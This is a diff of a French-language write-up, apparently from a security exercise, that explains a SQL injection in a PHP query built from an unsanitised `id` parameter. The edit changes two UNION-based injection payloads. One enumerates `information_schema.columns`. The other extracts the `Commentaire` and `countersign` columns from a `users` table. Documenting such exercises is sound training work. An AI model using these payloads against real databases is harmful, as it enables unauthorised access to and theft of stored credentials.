@@ -12,14 +12,14 @@ SELECT id, firstname, surname FROM users WHERE id = $_GET['id']
 ```
 - En utilisant l’instruction `UNION`, l’attaquant peut afficher des données issues d'autres tables :
 ```sql
-id=1 or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
+1 or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
 ```
 - Cela permet de découvrir la structure complète de la base, comme la table `users` et ses colonnes :
   - `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, `countersign`
 
 - Requête d’exploitation ayant permis d'obtenir des données sensibles :
 ```sql
-id=1 or 1=1 UNION SELECT Commentaire, countersign FROM users
+1 or 1=1 UNION SELECT Commentaire, countersign FROM users
 ```
 
 ![Alt text](Resources/1.png)
